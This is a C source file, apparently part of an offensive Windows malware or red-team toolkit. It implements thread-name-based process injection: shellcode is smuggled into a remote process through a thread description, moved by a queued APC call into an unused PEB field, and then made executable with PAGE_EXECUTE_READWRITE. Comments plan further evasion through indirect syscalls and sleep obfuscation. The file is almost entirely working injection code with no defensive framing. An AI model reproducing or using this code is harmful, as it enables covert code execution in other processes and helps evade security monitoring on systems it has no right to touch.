// ThreadName alloc/writing & Heap encryption
// TODO: change winapi to indirect, Sleep obfuscation

#include <memoryapi.h>
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <unwin.h>

#include <stdio.h>
#include <stdint.h>
#include <time.h>
#include <libgen.h>

#include "../syscalls/syscalls.h"
#include "../debugging/debugging.h"
#include "memory.h"

#define UNSED_PEB_FIELD 0x340

extern Ade GlobalAde;

NTSTATUS CustomSetThreadDescription(HANDLE hThread, BYTE* buf, SIZE_T bufSize) {
    UNICODE_STRING bufString;

    //
    // Make a buffer full of 0x01 
    //
    BYTE* backet = calloc(bufSize + sizeof(WCHAR), 1);
    memset(backet, 0x01, bufSize);

    //
    // Init the Unicode string
    //
    RtlInitUnicodeString(&bufString, (PWCHAR)backet);
    memcpy(bufString.Buffer, buf, bufSize);
    NTSTATUS status = NtSetInformationThread(
        hThread,
        ThreadNameInformation,
        &bufString,
        sizeof(UNICODE_STRING)
    );

    return status;
}

WINBOOL ThreadNameAlloc(
    HANDLE hProcess,
    PBYTE shellcode,
    size_t shellcodeSize,
    MEMORY_ALLOC* MemoryAllocOut 
) {
    ULONG_PTR                 pebField; // UNUSED PEB FIELD
    PPEB                      ptrPeb;
    PROCESS_BASIC_INFORMATION pbi;

    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof( PROCESS_BASIC_INFORMATION ),
        NULL
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("NtQueryInformationProcess: 0x%lx", status);
        return FALSE;
    }

    ptrPeb   = pbi.PebBaseAddress;
    pebField = (ULONG_PTR) ptrPeb + UNSED_PEB_FIELD;

    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE) ExitThread,
        NULL,
        CREATE_SUSPENDED,
        NULL
    );

    if (hThread == INVALID_HANDLE_VALUE) {
        DEBUG_ERROR("CreateRemoteThread: 0x%lx", GetLastError());
        return FALSE;
    }

    status = CustomSetThreadDescription(
        hThread,
        shellcode,
        shellcodeSize
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("CustomSetThreadDescription: 0x%lx", status);
        return FALSE;
    }

    status = NtQueueApcThread(
        hThread,
        (PPS_APC_ROUTINE) GetThreadDescription,
        (void*) NtCurrentThread,
        (void*) pebField,
        0
    );

    if ( NT_ERROR(status) ) {
        DEBUG_ERROR("NtQueueApcThread: 0x%lx", status);
        return FALSE;
    }

    ResumeThread(hThread);
    WaitForSingleObject(hThread, INFINITE);

    void* ptrShellcode = NULL;
    ReadProcessMemory(
        hProcess,
        (LPVOID) pebField,
        &ptrShellcode,
        sizeof(void*),
        NULL
    );

    if (ptrShellcode == NULL) {
        DEBUG_ERROR("ReadProcessMemory: 0x%lx", GetLastError());
        DEBUG_ERROR("REMOTE SHELLCODE: 0x%p", ptrShellcode);
        return FALSE;
    }

    DWORD oldProtection;
    if (!VirtualProtectEx(
        hProcess,
        ptrShellcode,
        shellcodeSize,
        PAGE_EXECUTE_READWRITE,
        &oldProtection
    )) {
        DEBUG_ERROR("VirtualProtectEx: 0x%lx", GetLastError());
        return FALSE;
    }

    MemoryAllocOut->executionAddr = ptrShellcode;
    
    return TRUE;
}

//
// Stack & Heap encryption 
//
VOID TimerPastaAlPestoEPomodoro(ULONG time) {


}
